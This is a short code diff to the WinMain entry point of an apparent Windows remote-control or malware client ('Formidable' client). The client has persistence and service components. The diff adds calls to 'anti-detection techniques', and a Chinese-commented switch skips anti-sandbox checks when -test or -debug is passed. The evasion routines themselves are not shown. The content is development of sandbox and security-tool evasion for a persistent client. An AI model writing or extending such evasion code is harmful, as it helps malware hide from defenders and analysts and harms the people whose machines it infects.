@@ -16,6 +16,7 @@
 #include "../../Common/Utils.h"
 #include "../../Common/ClientCore.h"
 #include "Security/PersistenceOptimizer.h"
+#include "Security/AntiDetectionTechniques.h"
 #include "Utils/Logger.h"
 #include "Core/AutomationManager.h"
 
@@ -79,7 +80,17 @@ void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    // 检查命令行参数，如果包含 -test 或 -debug，跳过反沙箱检测
+    bool skipSecurity = false;
+    if (lpCmdLine && (strstr(lpCmdLine, "-test") || strstr(lpCmdLine, "-debug"))) {
+        skipSecurity = true;
+    }
+
     InitClientCore();
+    
+    // 初始化并应用反检测技术
+    Formidable::Client::Security::AntiDetectionTechniques::InitializeAntiDetection();
+    Formidable::Client::Security::AntiDetectionTechniques::ApplyTechniques();
 
     // 确保每个会话只有一个实例运行
     DWORD sessionId = 0;
